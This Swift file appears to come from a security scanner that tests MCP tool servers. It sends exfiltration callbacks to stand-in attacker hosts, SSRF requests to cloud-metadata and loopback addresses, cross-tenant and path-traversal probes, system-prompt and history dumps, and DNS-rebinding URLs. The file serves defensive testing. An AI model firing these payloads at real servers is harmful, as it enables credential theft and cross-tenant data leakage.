// RADIANT v4.18.0 - MCP-05: Data Exfiltration & SSRF Executor
// Tests for tool-based data exfiltration, SSRF, cross-tenant leakage, conversation history exfiltration, and DNS rebinding

import Foundation

struct MCPDataExfiltrationExecutor: SecurityTestExecutor {
    let testId: String

    func execute(
        endpoint: EndpointConfiguration,
        credentials: SecurityTestCredentials,
        logger: TestLogger
    ) async throws -> TestResult {
        let startTime = Date()

        switch testId {
        case "MCP-05.1": return try await testToolBasedExfiltration(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "MCP-05.2": return try await testSSRFViaToolParams(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "MCP-05.3": return try await testCrossTenantLeakage(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "MCP-05.4": return try await testConversationHistoryExfil(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "MCP-05.5": return try await testDNSRebinding(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        default:
            return TestResult(status: .error, findings: "Unknown test ID: \(testId)", evidence: [], remediation: nil, executionLog: await logger.getEntries(), duration: 0)
        }
    }

    private func testToolBasedExfiltration(
        endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date
    ) async throws -> TestResult {
        await logger.info("[MCP-05.1] Testing tool-based data exfiltration vectors")

        let exfilPayloads: [(label: String, params: [String: Any])] = [
            ("DNS exfil", ["url": "https://\(UUID().uuidString.prefix(8)).attacker.example.com/exfil", "action": "fetch"]),
            ("HTTP callback", ["callback_url": "https://evil.example.com/steal?data=sensitive", "action": "notify"]),
            ("Encoded in params", ["query": "SELECT * FROM users", "report_to": "https://evil.example.com/report"]),
        ]

        var findings: [String] = []
        var allBlocked = true

        for payload in exfilPayloads {
            let request: [String: Any] = [
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": ["name": "data_tool", "arguments": payload.params],
                "id": 1,
            ]

            let (statusCode, body) = try await sendRequest(request, to: endpoint, credentials: credentials, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: statusCode, headers: [:], body: body)

            let bodyLower = body.lowercased()
            if statusCode == 200 && (bodyLower.contains("fetched") || bodyLower.contains("callback sent") || bodyLower.contains("notified")) {
                allBlocked = false
                findings.append("\(payload.label): Potential exfiltration — server processed outbound request.")
                await logger.error("[MCP-05.1] FAIL: \(payload.label) may have succeeded")
            } else if statusCode == 400 || statusCode == 403 || statusCode == 422 {
                findings.append("\(payload.label): Blocked by server (HTTP \(statusCode)).")
                await logger.success("[MCP-05.1] \(payload.label) blocked")
            } else {
                findings.append("\(payload.label): HTTP \(statusCode) — manual review needed.")
                await logger.info("[MCP-05.1] \(payload.label): Status \(statusCode)")
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        return TestResult(
            status: allBlocked ? .passed : .failed,
            findings: findings.joined(separator: "\n"),
            evidence: await logger.getEvidence(),
            remediation: allBlocked ? nil : "Implement network egress controls for tool execution. Block outbound requests to unauthorized domains. Use URL allowlists for any tool that makes network requests. Monitor and alert on unusual outbound traffic patterns.",
            executionLog: await logger.getEntries(),
            duration: duration
        )
    }

    private func testSSRFViaToolParams(
        endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date
    ) async throws -> TestResult {
        await logger.info("[MCP-05.2] Testing SSRF via MCP tool URL parameters")

        let ssrfTargets: [(label: String, url: String)] = [
            ("AWS metadata v1", "http://169.254.169.254/latest/meta-data/"),
            ("AWS metadata v2", "http://169.254.169.254/latest/api/token"),
            ("Localhost", "http://localhost:8080/admin"),
            ("Internal DNS", "http://internal-service.local/api/secrets"),
            ("IPv6 loopback", "http://[::1]:8080/admin"),
            ("Decimal IP", "http://2130706433:8080/"), // 127.0.0.1 in decimal
            ("Hex IP", "http://0x7f000001:8080/"),
        ]

        var findings: [String] = []
        var allBlocked = true

        for target in ssrfTargets {
            let request: [String: Any] = [
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": ["name": "fetch_url", "arguments": ["url": target.url]],
                "id": 1,
            ]

            let (statusCode, body) = try await sendRequest(request, to: endpoint, credentials: credentials, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: statusCode, headers: [:], body: body)

            let bodyLower = body.lowercased()
            let ssrfSuccess = bodyLower.contains("ami-id") || bodyLower.contains("instance-id") ||
                bodyLower.contains("iam/security-credentials") || bodyLower.contains("admin") ||
                (statusCode == 200 && body.count > 100)

            if ssrfSuccess {
                allBlocked = false
                findings.append("\(target.label) (\(target.url)): SSRF SUCCESSFUL — internal resource accessed!")
                await logger.error("[MCP-05.2] CRITICAL: SSRF succeeded for \(target.label)")
            } else if statusCode == 400 || statusCode == 403 || statusCode == 422 {
                findings.append("\(target.label): Blocked (HTTP \(statusCode)).")
                await logger.success("[MCP-05.2] \(target.label) blocked")
            } else {
                findings.append("\(target.label): HTTP \(statusCode) — likely blocked.")
                await logger.info("[MCP-05.2] \(target.label): Status \(statusCode)")
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        return TestResult(
            status: allBlocked ? .passed : .failed,
            findings: findings.joined(separator: "\n"),
            evidence: await logger.getEvidence(),
            remediation: allBlocked ? nil : "Implement comprehensive SSRF protection: block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost, ::1), reject decimal/hex IP encoding, validate against URL allowlists, and use IMDSv2 with hop limit=1 on EC2 instances.",
            executionLog: await logger.getEntries(),
            duration: duration
        )
    }

    private func testCrossTenantLeakage(
        endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date
    ) async throws -> TestResult {
        await logger.info("[MCP-05.3] Testing cross-tenant data leakage via MCP")

        let tenantProbes: [(label: String, params: [String: Any])] = [
            ("Tenant ID manipulation", ["tenant_id": "other-tenant-id-12345", "query": "SELECT * FROM data"]),
            ("Header injection", ["X-Tenant-Id": "victim-tenant", "query": "list_resources"]),
            ("Path traversal", ["resource": "../other-tenant/secrets"]),
        ]

        var findings: [String] = []
        var allIsolated = true

        for probe in tenantProbes {
            let request: [String: Any] = [
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": ["name": "query_data", "arguments": probe.params],
                "id": 1,
            ]

            let (statusCode, body) = try await sendRequest(request, to: endpoint, credentials: credentials, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: statusCode, headers: [:], body: body)

            if statusCode == 200 && body.count > 200 {
                let bodyLower = body.lowercased()
                if bodyLower.contains("other-tenant") || bodyLower.contains("victim-tenant") {
                    allIsolated = false
                    findings.append("\(probe.label): Cross-tenant data may have been returned.")
                    await logger.error("[MCP-05.3] FAIL: \(probe.label) may have leaked cross-tenant data")
                } else {
                    findings.append("\(probe.label): Response received but no cross-tenant indicators detected.")
                    await logger.info("[MCP-05.3] \(probe.label): No clear cross-tenant data")
                }
            } else if statusCode == 403 || statusCode == 400 {
                findings.append("\(probe.label): Tenant isolation enforced (HTTP \(statusCode)).")
                await logger.success("[MCP-05.3] \(probe.label) isolated")
            } else {
                findings.append("\(probe.label): HTTP \(statusCode) — review needed.")
                await logger.info("[MCP-05.3] \(probe.label): Status \(statusCode)")
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        return TestResult(
            status: allIsolated ? .passed : .failed,
            findings: findings.joined(separator: "\n"),
            evidence: await logger.getEvidence(),
            remediation: allIsolated ? nil : "Enforce tenant isolation at the database query level using RLS (Row-Level Security). Never trust client-supplied tenant IDs. Derive tenant context from authenticated session only. Validate all resource paths against tenant boundaries.",
            executionLog: await logger.getEntries(),
            duration: duration
        )
    }

    private func testConversationHistoryExfil(
        endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date
    ) async throws -> TestResult {
        await logger.info("[MCP-05.4] Testing conversation history exfiltration via MCP tools")

        let probeRequests: [(label: String, params: [String: Any])] = [
            ("Direct history request", ["action": "get_conversation_history"]),
            ("System prompt request", ["action": "get_system_prompt"]),
            ("Context dump", ["action": "dump_context", "format": "json"]),
        ]

        var findings: [String] = []
        var allProtected = true

        for probe in probeRequests {
            let request: [String: Any] = [
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": ["name": "helper", "arguments": probe.params],
                "id": 1,
            ]

            let (statusCode, body) = try await sendRequest(request, to: endpoint, credentials: credentials, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: statusCode, headers: [:], body: body)

            let bodyLower = body.lowercased()
            let hasHistory = bodyLower.contains("conversation") && bodyLower.contains("message") && body.count > 500
            let hasSystemPrompt = bodyLower.contains("system prompt") || bodyLower.contains("you are") && bodyLower.contains("assistant")

            if hasHistory || hasSystemPrompt {
                allProtected = false
                findings.append("\(probe.label): Response may contain conversation history or system prompt.")
                await logger.error("[MCP-05.4] FAIL: \(probe.label) may have leaked context")
            } else {
                findings.append("\(probe.label): No conversation history or system prompt detected (HTTP \(statusCode)).")
                await logger.success("[MCP-05.4] \(probe.label) protected")
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        return TestResult(
            status: allProtected ? .passed : .failed,
            findings: findings.joined(separator: "\n"),
            evidence: await logger.getEvidence(),
            remediation: allProtected ? nil : "Tools must not have access to raw conversation history or system prompts. Implement strict information barriers between the tool execution environment and the LLM context. System prompts should be treated as confidential configuration.",
            executionLog: await logger.getEntries(),
            duration: duration
        )
    }

    private func testDNSRebinding(
        endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date
    ) async throws -> TestResult {
        await logger.info("[MCP-05.5] Testing DNS rebinding attack via MCP tools")

        let rebindingPayloads: [(label: String, url: String)] = [
            ("Rebinding domain", "http://rebind.attacker.example.com/api"),
            ("Short TTL domain", "http://ttl0.attacker.example.com/internal"),
            ("Double resolution", "http://dual.attacker.example.com/metadata"),
        ]

        var findings: [String] = []
        var allProtected = true

        for payload in rebindingPayloads {
            let request: [String: Any] = [
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": ["name": "fetch_url", "arguments": ["url": payload.url]],
                "id": 1,
            ]

            let (statusCode, body) = try await sendRequest(request, to: endpoint, credentials: credentials, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: statusCode, headers: [:], body: body)

            if statusCode == 200 && body.count > 200 {
                let bodyLower = body.lowercased()
                if bodyLower.contains("internal") || bodyLower.contains("metadata") || bodyLower.contains("instance-id") {
                    allProtected = false
                    findings.append("\(payload.label): DNS rebinding may have bypassed SSRF protections.")
                    await logger.error("[MCP-05.5] FAIL: \(payload.label) potential bypass")
                } else {
                    findings.append("\(payload.label): Response received but no internal data indicators.")
                    await logger.info("[MCP-05.5] \(payload.label): No internal data")
                }
            } else if statusCode == 400 || statusCode == 403 || statusCode == 422 {
                findings.append("\(payload.label): Blocked (HTTP \(statusCode)).")
                await logger.success("[MCP-05.5] \(payload.label) blocked")
            } else {
                findings.append("\(payload.label): HTTP \(statusCode) — likely blocked.")
                await logger.info("[MCP-05.5] \(payload.label): Status \(statusCode)")
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        return TestResult(
            status: allProtected ? .passed : .failed,
            findings: findings.joined(separator: "\n"),
            evidence: await logger.getEvidence(),
            remediation: allProtected ? nil : "Implement DNS rebinding protections: resolve DNS at request time and validate the IP before connecting, pin DNS resolutions, reject responses from private IP ranges even if the domain resolved to a public IP initially, and set minimum DNS TTL enforcement.",
            executionLog: await logger.getEntries(),
            duration: duration
        )
    }

    // MARK: - Helpers

    private func sendRequest(
        _ payload: [String: Any], to endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger
    ) async throws -> (Int, String) {
        var request = URLRequest(url: endpoint.url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.timeoutInterval = 15
        if let apiKey = credentials.apiKeys["aws_access_key_id"] {
            request.setValue(apiKey, forHTTPHeaderField: "X-Api-Key")
        }
        let jsonData = try JSONSerialization.data(withJSONObject: payload)
        request.httpBody = jsonData
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            let httpResponse = response as? HTTPURLResponse
            return (httpResponse?.statusCode ?? 0, String(data: data, encoding: .utf8) ?? "")
        } catch {
            return (0, "Network error: \(error.localizedDescription)")
        }
    }
}
